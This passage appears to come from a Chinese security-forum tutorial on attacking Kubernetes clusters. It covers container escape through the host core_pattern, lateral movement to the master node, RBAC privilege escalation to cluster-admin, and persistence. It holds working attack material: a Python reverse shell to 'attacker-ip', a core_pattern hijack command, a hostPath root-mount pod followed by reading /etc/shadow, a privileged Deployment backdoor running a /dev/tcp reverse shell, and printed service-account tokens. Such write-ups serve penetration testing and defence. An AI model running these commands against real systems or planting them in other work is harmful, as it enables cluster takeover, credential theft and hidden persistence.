+<p>在容器中首先拿到当前容器在宿主机上的绝对路径：</p>
+<div class="highlight"><pre><span></span><span class="l l-Scalar l-Scalar-Plain">root@mount-host-procfs:/# cat /proc/mounts | grep docker</span>
+<span class="l l-Scalar l-Scalar-Plain">overlay / overlay rw,relatime,lowerdir=/var/lib/docker/overlay2/l/SDXPXVSYNB3RPWJYHAD5RIIIMO:/var/lib/docker/overlay2/l/QJFV62VKQFBRS5T5ZW4SEMZQC6:/var/lib/docker/overlay2/l/SSCMLZUT23WUSPXAOVLGLRRP7W:/var/lib/docker/overlay2/l/IBTHKEVQBPDIYMRIVBSVOE2A6Y:/var/lib/docker/overlay2/l/YYE5TPGYGPOWDNU7KP3JEWWSQM,upperdir=/var/lib/docker/overlay2/4aac278b06d86b0d7b6efa4640368820c8c16f1da8662997ec1845f3cc69ccee/diff,workdir=/var/lib/docker/overlay2/4aac278b06d86b0d7b6efa4640368820c8c16f1da8662997ec1845f3cc69ccee/work 0 0</span>
+</pre></div>
+<p>从workdir可以得到基础路径，结合背景知识可知当前容器在宿主机上的merged目录绝对路径如下：</p>
+<div class="highlight"><pre><span></span><span class="l l-Scalar l-Scalar-Plain">/var/lib/docker/overlay2/4aac278b06d86b0d7b6efa4640368820c8c16f1da8662997ec1845f3cc69ccee/merged</span>
+</pre></div>
+<p>向容器内/host-proc/sys/kernel/core_pattern内写入以下内容：</p>
+<div class="highlight"><pre><span></span><span class="l l-Scalar l-Scalar-Plain">echo -e "|/var/lib/docker/overlay2/4aac278b06d86b0d7b6efa4640368820c8c16f1da8662997ec1845f3cc69ccee/merged/tmp/.x.py \rcore  " &gt; /host-proc/sys/kernel/core_pattern</span>
+</pre></div>
+<p>然后在容器内创建一个反弹shell的/tmp/.x.py：</p>
+<div class="highlight"><pre><span></span><span class="l l-Scalar l-Scalar-Plain">cat &gt;/tmp/.x.py &lt;&lt; EOF</span>
+<span class="l l-Scalar l-Scalar-Plain">#!/usr/bin/python</span>
+<span class="l l-Scalar l-Scalar-Plain">import os</span>
+<span class="l l-Scalar l-Scalar-Plain">import pty</span>
+<span class="l l-Scalar l-Scalar-Plain">import socket</span>
+<span class="l l-Scalar l-Scalar-Plain">lhost = "attacker-ip"</span>
+<span class="l l-Scalar l-Scalar-Plain">lport = 10000</span>
+<span class="l l-Scalar l-Scalar-Plain">def main()</span><span class="p p-Indicator">:</span>
+    <span class="l l-Scalar l-Scalar-Plain">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span>
+    <span class="l l-Scalar l-Scalar-Plain">s.connect((lhost, lport))</span>
+    <span class="l l-Scalar l-Scalar-Plain">os.dup2(s.fileno(), 0)</span>
+    <span class="l l-Scalar l-Scalar-Plain">os.dup2(s.fileno(), 1)</span>
+    <span class="l l-Scalar l-Scalar-Plain">os.dup2(s.fileno(), 2)</span>
+    <span class="l l-Scalar l-Scalar-Plain">os.putenv("HISTFILE", '/dev/null')</span>
+    <span class="l l-Scalar l-Scalar-Plain">pty.spawn("/bin/bash")</span>
+    <span class="l l-Scalar l-Scalar-Plain">os.remove('/tmp/.x.py')</span>
+    <span class="l l-Scalar l-Scalar-Plain">s.close()</span>
+<span class="l l-Scalar l-Scalar-Plain">if __name__ == "__main__"</span><span class="p p-Indicator">:</span>
+    <span class="l l-Scalar l-Scalar-Plain">main()</span>
+<span class="l l-Scalar l-Scalar-Plain">EOF</span>
+
+<span class="l l-Scalar l-Scalar-Plain">chmod +x /tmp/.x.py</span>
+</pre></div>
+<p>最后在容器内运行一个可以崩溃的程序即可，例如：</p>
+<div class="highlight"><pre><span></span><span class="c1">#include &lt;stdio.h&gt;</span>
+<span class="l l-Scalar l-Scalar-Plain">int main(void)</span>
+<span class="l l-Scalar l-Scalar-Plain">{</span>
+    <span class="l l-Scalar l-Scalar-Plain">int *a = NULL;</span>
+    <span class="l l-Scalar l-Scalar-Plain">*a = 1;</span>
+    <span class="l l-Scalar l-Scalar-Plain">return 0;</span>
+<span class="l l-Scalar l-Scalar-Plain">}</span>
+</pre></div>
+<p>容器内若没有编译器，可以先在其他机器上编译好后放入容器中，等完成后在其他机器上开启shell监听：</p>
+<div class="highlight"><pre><span></span><span class="l l-Scalar l-Scalar-Plain">ncat -lvnp 10000</span>
+</pre></div>
+<p>接着在容器内执行上述编译好的崩溃程序，即可获得反弹shell</p>
+<h2 data-content="1" id="03909eb36a494f32ff1c84a7be54ea63">横向渗透</h2>
+<h3 data-content="1" id="4b8a34cfc3ea922c677c918351198d18">基础知识</h3>
+<p>污点是K8s高级调度的特性，用于限制哪些Pod可以被调度到某一个节点，一般主节点包含一个污点，这个污点是阻止Pod调度到主节点上面，除非有Pod能容忍这个污点，而通常容忍这个污点的Pod都是系统级别的Pod，例如:kube-system<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20231027141814-9c3f5066-7490-1.png"/></p>
+<h3 data-content="1" id="aa4e4bcd751ef61507021a281a8dac8f">基本原理</h3>
+<p>攻击者在获取到node节点的权限后可以通过kubectl来创建一个能够容忍主节点的污点的Pod，当该Pod被成功创建到Master上之后，攻击者可以通过在子节点上操作该Pod实现对主节点的控制</p>
+<h3 data-content="1" id="481d3beed84e72dad55fbfa000e6e6ac">横向移动</h3>
+<p>Step 1：Node中查看节点信息</p>
+<div class="highlight"><pre><span></span><span class="l l-Scalar l-Scalar-Plain">kubectl get nodes</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231027141908-bc97729e-7490-1.png"/><br/>
+Step 2：确认Master节点的容忍度</p>
+<div class="highlight"><pre><span></span><span class="c1">#方式一</span>
+<span class="l l-Scalar l-Scalar-Plain">kubectl describe nodes master</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231027141931-ca989ff8-7490-1.png"/></p>
+<div class="highlight"><pre><span></span><span class="c1">#方式二</span>
+<span class="l l-Scalar l-Scalar-Plain">kubectl describe node master | grep 'Taints' -A 5</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231027141947-d41752ea-7490-1.png"/><br/>
+Step 3：创建带有容忍参数的Pod(必要时可以修改Yaml使Pod增加到特定的Node上去)</p>
+<div class="highlight"><pre><span></span><span class="l l-Scalar l-Scalar-Plain">apiVersion</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">v1</span>
+<span class="l l-Scalar l-Scalar-Plain">kind</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">Pod</span>
+<span class="l l-Scalar l-Scalar-Plain">metadata</span><span class="p p-Indicator">:</span>
+  <span class="l l-Scalar l-Scalar-Plain">name</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">control-master-15</span>
+<span class="l l-Scalar l-Scalar-Plain">spec</span><span class="p p-Indicator">:</span>
+  <span class="l l-Scalar l-Scalar-Plain">tolerations</span><span class="p p-Indicator">:</span>
+    <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">key</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">node-role.kubernetes.io/master</span>
+      <span class="l l-Scalar l-Scalar-Plain">operator</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">Exists</span>
+      <span class="l l-Scalar l-Scalar-Plain">effect</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">NoSchedule</span>
+  <span class="l l-Scalar l-Scalar-Plain">containers</span><span class="p p-Indicator">:</span>
+    <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">name</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">control-master-15</span>
+      <span class="l l-Scalar l-Scalar-Plain">image</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">ubuntu:18.04</span>
+      <span class="l l-Scalar l-Scalar-Plain">command</span><span class="p p-Indicator">:</span> <span class="p p-Indicator">[</span><span class="s">"/bin/sleep"</span><span class="p p-Indicator">,</span> <span class="s">"3650d"</span><span class="p p-Indicator">]</span>
+      <span class="l l-Scalar l-Scalar-Plain">volumeMounts</span><span class="p p-Indicator">:</span>
+      <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">name</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">master</span>
+        <span class="l l-Scalar l-Scalar-Plain">mountPath</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">/master</span>
+  <span class="l l-Scalar l-Scalar-Plain">volumes</span><span class="p p-Indicator">:</span>
+  <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">name</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">master</span>
+    <span class="l l-Scalar l-Scalar-Plain">hostPath</span><span class="p p-Indicator">:</span>
+      <span class="l l-Scalar l-Scalar-Plain">path</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">/</span>
+      <span class="l l-Scalar l-Scalar-Plain">type</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">Directory</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231027142010-e179c12a-7490-1.png"/></p>
+<div class="highlight"><pre><span></span><span class="c1">#创建Pod</span>
+<span class="l l-Scalar l-Scalar-Plain">kubectl create -f control-master.yaml</span>
+
+<span class="l l-Scalar l-Scalar-Plain">#部署情况</span>
+<span class="l l-Scalar l-Scalar-Plain">kubectl get deploy -o wide</span>
+
+<span class="l l-Scalar l-Scalar-Plain">#Pod详情</span>
+<span class="l l-Scalar l-Scalar-Plain">kubectl get pod -o wide</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231027142032-eec932f2-7490-1.png"/><br/>
+Step 4：获得Master控制端</p>
+<div class="highlight"><pre><span></span><span class="l l-Scalar l-Scalar-Plain">kubectl exec control-master-15 -it bash</span>
+<span class="l l-Scalar l-Scalar-Plain">chroot /master bash</span>
+<span class="l l-Scalar l-Scalar-Plain">ls -al</span>
+<span class="l l-Scalar l-Scalar-Plain">cat /etc/shadow</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231027142051-f9e180fe-7490-1.png"/></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231027142058-fe288252-7490-1.png"/></p>
+<h4 data-content="1" id="e6dc0f514e86b6d8769e9319b4aa9216">扩展技巧</h4>
+<p>执行以下命令清除污点之后直接执行部署Pod到Master上，之后通过挂载实现逃逸获取Master节点的权限</p>
+<div class="highlight"><pre><span></span><span class="c1">#清除污点</span>
+<span class="l l-Scalar l-Scalar-Plain">kubectl taint nodes debian node-role.kubernetes.io/master:NoSchedule-</span>
+
+<span class="l l-Scalar l-Scalar-Plain">#查看污点</span>
+<span class="l l-Scalar l-Scalar-Plain">kubectl describe node master | grep 'Taints' -A 5</span>
+</pre></div>
+<h2 data-content="1" id="68b2843863a18312cf881192a7280f1e">权限提升</h2>
+<p>K8s中的权限提升可以参考以下CVE链接，这里不再做复现：<br/>
+1、CVE-2018-1002105:Kubernetes API Server Privileges Escalation：<br/>
+<a href="https://goteleport.com/blog/kubernetes-websocket-upgrade-security-vulnerability/" target="_blank">https://goteleport.com/blog/kubernetes-websocket-upgrade-security-vulnerability/</a><br/>
+2、CVE-2019-11247:Kubernetes API Server Privileges Escalation：<br/>
+<a href="https://github.com/kubernetes/kubernetes/issues/80983" target="_blank">https://github.com/kubernetes/kubernetes/issues/80983</a><br/>
+3、CVE-2020-8559:Kubernetes API Server Privileges Escalation：<br/>
+<a href="https://github.com/tdwyer/CVE-2020-8559" target="_blank">https://github.com/tdwyer/CVE-2020-8559</a><br/>
+下面对Rolebinding权限提升进行一个简单的演示：</p>
+<h3 data-content="1" id="e4372d0fc5d293d351ac8cc46ef71143">基本介绍</h3>
+<p>K8s使用基于角色的访问控制(RBAC)来进行操作鉴权，允许管理员通过Kubernetes API动态配置策略，某些情况下运维人员为了操作便利，会对普通用户授予cluster-admin的角色，攻击者如果收集到该用户登录凭证后，可直接以最高权限接管K8s集群，少数情况下攻击者可以先获取角色绑定(RoleBinding)权限，并将其他用户添加cluster-admin或其他高权限角色来完成提权</p>
+<h3 data-content="1" id="27a1b371614e729d6eb4f0b593889630">简易实例</h3>
+<p>Step 1：下载yaml文件</p>
+<div class="highlight"><pre><span></span><span class="l l-Scalar l-Scalar-Plain">wget https://raw.githubusercontent.com/kubernetes/dashboard/v2.0.0-beta8/aio/deploy/recommended.yaml</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231027142633-c5e5ac20-7491-1.png"/><br/>
+Step 2：修改YAML文件<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20231027142646-cd97d678-7491-1.png"/><br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20231027142658-d5091e12-7491-1.png"/><br/>
+Step 3：下载镜像<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20231027142710-dbd29c50-7491-1.png"/><br/>
+Step 4：进行部署操作</p>
+<div class="highlight"><pre><span></span><span class="c1">#部署操作</span>
+<span class="l l-Scalar l-Scalar-Plain">kubectl apply -f kubernetes-dashboard.yaml</span>
+
+<span class="l l-Scalar l-Scalar-Plain">#删除操作</span>
+<span class="l l-Scalar l-Scalar-Plain">kubectl delete -f kubernetes-dashboard.yaml</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231027142730-e82fd332-7491-1.png"/><br/>
+Step 5：查看pod和service状态</p>
+<div class="highlight"><pre><span></span><span class="l l-Scalar l-Scalar-Plain">kubectl get pods,svc -n kubernetes-dashboard -o wide</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231027142752-f541a87a-7491-1.png"/><br/>
+Step 6：查看所有的pod</p>
+<div class="highlight"><pre><span></span><span class="l l-Scalar l-Scalar-Plain">kubectl get pods --all-namespaces -o wide</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231027142812-00e0600e-7492-1.png"/><br/>
+Step 7：在浏览器中访问，选择用默认用户kubernetes-dashboard的token登陆</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231027142827-09cd17ac-7492-1.png"/><br/>
+Step 8：查看serviceaccount和secrets</p>
+<div class="highlight"><pre><span></span><span class="l l-Scalar l-Scalar-Plain">kubectl  get sa,secrets -n kubernetes-dashboard</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231027142841-123a26f0-7492-1.png"/><br/>
+Step 9：查看token</p>
+<div class="highlight"><pre><span></span><span class="l l-Scalar l-Scalar-Plain">kubectl describe secrets kubernetes-dashboard-token-8kxnh -n kubernetes-dashboard</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231027142859-1d1f000e-7492-1.png"/></p>
+<div class="highlight"><pre><span></span><span class="l l-Scalar l-Scalar-Plain">eyJhbGciOiJSUzI1NiIsImtpZCI6Iml3OVRtaVlnREpPQ0h2ZlUwSDBleFlIc29qcXgtTmtaUFN4WDk4NjZkV1EifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlcm5ldGVzLWRhc2hib2FyZCIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJrdWJlcm5ldGVzLWRhc2hib2FyZC10b2tlbi04a3huaCIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50Lm5hbWUiOiJrdWJlcm5ldGVzLWRhc2hib2FyZCIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50LnVpZCI6ImMyYTE0NTAzLTc4MzgtNGY3MS1iOTBjLTFhMWJkOTk4NGFiMiIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDprdWJlcm5ldGVzLWRhc2hib2FyZDprdWJlcm5ldGVzLWRhc2hib2FyZCJ9.bQOXikheuY7kL0Dki0mLmyVvGT9cDc4HvdUWXPRywjFPCZNeX6mMurU6pr9LJR25MFwF4Y3ZlnGzHDbrGR-bYRLwDsSvX-qvh0BLCZhQORE2gfd971lCQc7uoyrkf-EJrg26_0C2yGGhZI7JdcRDjrjuHG0aZpQ1vNZYrIWwj5hj9yn7xVI0-dVLbjx8_1kmRXIKw5dk3c_x8aKh-fLSZ-ncpMBf35GGisUHzsdPWup_fqoQKZr4TcEMYc2FcooDQ_mnhBL-WVTbHM9z-LEcebTaCepYR7f-655nRXrDWQe3H524Vvak9aEHI9xK8qHWk1546ka14fMsYTqi3Ra-Tg</span>
+</pre></div>
+<p>Step 10：使用默认用户的token登录<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20231027142918-2856dac8-7492-1.png"/><br/>
+之后发现权限略有不足：<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20231027142932-30581aa2-7492-1.png"/><br/>
+Step 11：新建管理员<br/>
+a、创建serviceaccount</p>
+<div class="highlight"><pre><span></span><span class="l l-Scalar l-Scalar-Plain">kubectl create serviceaccount admin-myuser -n kubernetes-dashboard</span>
+</pre></div>
+<p>b、绑定集群管理员</p>
+<div class="highlight"><pre><span></span><span class="l l-Scalar l-Scalar-Plain">kubectl create clusterrolebinding  dashboard-cluster-admin --clusterrole=cluster-admin --serviceaccount=kubernetes-dashboard:admin-myuser</span>
+</pre></div>
+<div class="highlight"><pre><span></span><span class="l l-Scalar l-Scalar-Plain">kubectl get sa,secrets -n kubernetes-dashboard</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231027143020-4d641a06-7492-1.png"/><br/>
+c、查看token</p>
+<div class="highlight"><pre><span></span><span class="l l-Scalar l-Scalar-Plain">kubectl describe secret admin-myuser-token-jcj9d -n kubernetes-dashboard</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231027143044-5b7b8ae8-7492-1.png"/></p>
+<div class="highlight"><pre><span></span><span class="l l-Scalar l-Scalar-Plain">eyJhbGciOiJSUzI1NiIsImtpZCI6Iml3OVRtaVlnREpPQ0h2ZlUwSDBleFlIc29qcXgtTmtaUFN4WDk4NjZkV1EifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlcm5ldGVzLWRhc2hib2FyZCIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJhZG1pbi1teXVzZXItdG9rZW4tamNqOWQiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC5uYW1lIjoiYWRtaW4tbXl1c2VyIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQudWlkIjoiYjM5MjBlZWEtMzA1NS00ZDQzLWEyMWMtNDk4MDEwM2NhMjhmIiwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50Omt1YmVybmV0ZXMtZGFzaGJvYXJkOmFkbWluLW15dXNlciJ9.DC1dSWMY46GzOZiSDsQWjO2dNIQ6ZsO_KDDfWjJ74m8ugPoklduiPeLj85n2NI03NKzCpXOaRRUR4LZHHT5KrpKFTsA9uPQyC0Lb3vi-UUZuQ4uhAZrzOxHx82tIcgNBSv-hXvIZytSrgm3RaItH20O3D-3NTEPt00ohD54cq6FyQPBqGi5yseLlTKj4Z2exbCCHxie67ID8ykaNnwcC8Ay1Ccznlvqu8ffdTejrcqFEyGZqHW3NuBxtYGkh_THdZIGHxaeqgLlGb7i2SbOr3IPeQGlf9l-rRKFSIMqvK_0SFBM9BiA0A4lEv26ro2LC4_PxF6o5_QOAz7X0E65hfw</span>
+</pre></div>
+<p>Step 12：登录dashboard</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231027143101-656ae2a6-7492-1.png"/><br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20231027143107-693c1738-7492-1.png"/><br/>
+随后可以进行逃逸等操作，具体看上篇，这里不再赘述</p>
+<h2 data-content="1" id="4d4a714d1cb8cb4e330f2bd0163c3b8c">权限维持</h2>
+<h3 data-content="1" id="3544632c66ab1bb096f060331e13756d">Deployment特性</h3>
+<h4 data-content="1" id="5d918a89b606aa698b3ab0ac720d77c3">基本概述</h4>
+<p>如果创建容器时启用了DaemonSets、Deployments那么便可以使容器和子容器即使被清理掉了也可以恢复，攻击者可利用这个特性实现持久化，相关概念如下：<br/>
+ReplicationController(RC)：ReplicationController确保在任何时候都有特定数量的Pod副本处于运行状态<br/>
+Replication Set(RS)：官方推荐使用RS和Deployment来代替RC，实际上RS和RC的功能基本一致，目前唯一的一个区别就是RC只支持基于等式的selector<br/>
+Deployment：主要职责和RC一样，都是保证Pod的数量和健康，二者大部分功能都是完全一致的，可以看成是一个升级版的RC控制器，官方组件kube-dns、kube-proxy也都是使用的Deployment来管理</p>
+<h4 data-content="1" id="eb5000fab3fa8ca0b25e417c8517433f">手动实现</h4>
+<p>Step 1：创建dep.yaml文件并加入恶意载荷</p>
+<div class="highlight"><pre><span></span><span class="c1">#dep.yaml</span>
+<span class="l l-Scalar l-Scalar-Plain">apiVersion</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">apps/v1</span>
+<span class="l l-Scalar l-Scalar-Plain">kind</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">Deployment</span>                <span class="c1">#确保在任何时候都有特定数量的Pod副本处于运行状态</span>
+<span class="l l-Scalar l-Scalar-Plain">metadata</span><span class="p p-Indicator">:</span>
+  <span class="l l-Scalar l-Scalar-Plain">name</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">nginx-deploy</span>
+  <span class="l l-Scalar l-Scalar-Plain">labels</span><span class="p p-Indicator">:</span>
+    <span class="l l-Scalar l-Scalar-Plain">k8s-app</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">nginx-demo</span>
+<span class="l l-Scalar l-Scalar-Plain">spec</span><span class="p p-Indicator">:</span>
+  <span class="l l-Scalar l-Scalar-Plain">replicas</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">3</span>                   <span class="c1">#指定Pod副本数量</span>
+  <span class="l l-Scalar l-Scalar-Plain">selector</span><span class="p p-Indicator">:</span>
+    <span class="l l-Scalar l-Scalar-Plain">matchLabels</span><span class="p p-Indicator">:</span>
+      <span class="l l-Scalar l-Scalar-Plain">app</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">nginx</span>
+  <span class="l l-Scalar l-Scalar-Plain">template</span><span class="p p-Indicator">:</span>
+    <span class="l l-Scalar l-Scalar-Plain">metadata</span><span class="p p-Indicator">:</span>
+      <span class="l l-Scalar l-Scalar-Plain">labels</span><span class="p p-Indicator">:</span>
+        <span class="l l-Scalar l-Scalar-Plain">app</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">nginx</span>
+    <span class="l l-Scalar l-Scalar-Plain">spec</span><span class="p p-Indicator">:</span>
+      <span class="l l-Scalar l-Scalar-Plain">hostNetwork</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">true</span>
+      <span class="l l-Scalar l-Scalar-Plain">hostPID</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">true</span>
+      <span class="l l-Scalar l-Scalar-Plain">containers</span><span class="p p-Indicator">:</span>
+      <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">name</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">nginx</span>
+        <span class="l l-Scalar l-Scalar-Plain">image</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">nginx:1.7.9</span>
+        <span class="l l-Scalar l-Scalar-Plain">imagePullPolicy</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">IfNotPresent</span>
+        <span class="l l-Scalar l-Scalar-Plain">command</span><span class="p p-Indicator">:</span> <span class="p p-Indicator">[</span><span class="s">"bash"</span><span class="p p-Indicator">]</span>       <span class="c1">#反弹Shell</span>
+        <span class="l l-Scalar l-Scalar-Plain">args</span><span class="p p-Indicator">:</span> <span class="p p-Indicator">[</span><span class="s">"-c"</span><span class="p p-Indicator">,</span> <span class="s">"bash</span><span class="nv"> </span><span class="s">-i</span><span class="nv"> </span><span class="s">&gt;&amp;</span><span class="nv"> </span><span class="s">/dev/tcp/192.168.17.164/4444</span><span class="nv"> </span><span class="s">0&gt;&amp;1"</span><span class="p p-Indicator">]</span>
+        <span class="l l-Scalar l-Scalar-Plain">securityContext</span><span class="p p-Indicator">:</span>
+          <span class="l l-Scalar l-Scalar-Plain">privileged</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">true</span>      <span class="c1">#特权模式</span>
+        <span class="l l-Scalar l-Scalar-Plain">volumeMounts</span><span class="p p-Indicator">:</span>
+        <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">mountPath</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">/host</span>
+          <span class="l l-Scalar l-Scalar-Plain">name</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">host-root</span>
+      <span class="l l-Scalar l-Scalar-Plain">volumes</span><span class="p p-Indicator">:</span>
+      <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">name</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">host-root</span>
+        <span class="l l-Scalar l-Scalar-Plain">hostPath</span><span class="p p-Indicator">:</span>
+          <span class="l l-Scalar l-Scalar-Plain">path</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">/</span>
+          <span class="l l-Scalar l-Scalar-Plain">type</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">Directory</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231027143226-983ed94e-7492-1.png"/><br/>
+Step 2：使用kubectl来创建后门Pod</p>
+<div class="highlight"><pre><span></span><span class="c1">#创建</span>
+<span class="l l-Scalar l-Scalar-Plain">kubectl create -f dep.yaml</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231027143242-a1edd04e-7492-1.png"/><br/>
+Step 3：成功反弹shell回来，且为节点的shell<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20231027143252-a7a1dbf2-7492-1.png"/><br/>
+Step 4：查看当前权限发现属于特权模式</p>
+<div class="highlight"><pre><span></span><span class="l l-Scalar l-Scalar-Plain">cat /proc/self/status | grep CapEff</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231027143308-b1540c24-7492-1.png"/><br/>
+Step 6：之后切换至host目录下可以看到成功挂载宿主机目录</p>
+<div class="highlight"><pre><span></span><span class="l l-Scalar l-Scalar-Plain">cd host</span>
+<span class="l l-Scalar l-Scalar-Plain">cd home</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231027143328-bd83a824-7492-1.png"/><br/>
+Step 7：删除pod</p>
+<div class="highlight"><pre><span></span><span class="l l-Scalar l-Scalar-Plain">kubectl delete -f dep.yaml</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231027143346-c7f56450-7492-1.png"/></p>
+<h4 data-content="1" id="2a363d10b0bb7bc4ee2fdd7b97f8cb36">工具实现</h4>
+<div class="highlight"><pre><span></span><span class="l l-Scalar l-Scalar-Plain">./cdk run k8s-backdoor-daemonset (default|anonymous|&lt;service-account-token-path&gt;) &lt;image&gt;</span>
+
+<span class="l l-Scalar l-Scalar-Plain">Request Options</span><span class="p p-Indicator">:</span>
+<span class="l l-Scalar l-Scalar-Plain">default</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">connect API server with pod's default service account token</span>
+<span class="l l-Scalar l-Scalar-Plain">anonymous</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">connect API server with user system:anonymous</span>
+<span class="l l-Scalar l-Scalar-Plain">&lt;service-account-token-path&gt;</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">connect API server with user-specified service account token.</span>
+
+<span class="l l-Scalar l-Scalar-Plain">Exploit Options</span><span class="p p-Indicator">:</span>
+<span class="l l-Scalar l-Scalar-Plain">&lt;image&gt;</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">your backdoor image (you can upload it to dockerhub before)</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231027143432-e3ab62b2-7492-1.png"/></p>
+<h3 data-content="1" id="decc26179277b95268a3539a46f2532a">Shadow API利用</h3>
+<h4 data-content="1" id="dfc14d81c9a3dd228c8e642d0d367b7c">基本概述</h4>
+<p>Shadow API Server攻击技术由安全研究人员Ian Coldwater在"Advanced Persistence Threats: The Future of Kubernetes Attacks"中首次提出，该攻击手法旨在创建一种针对K8S集群的隐蔽持续控制通道<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20231027143542-0d27a4de-7493-1.png"/><br/>
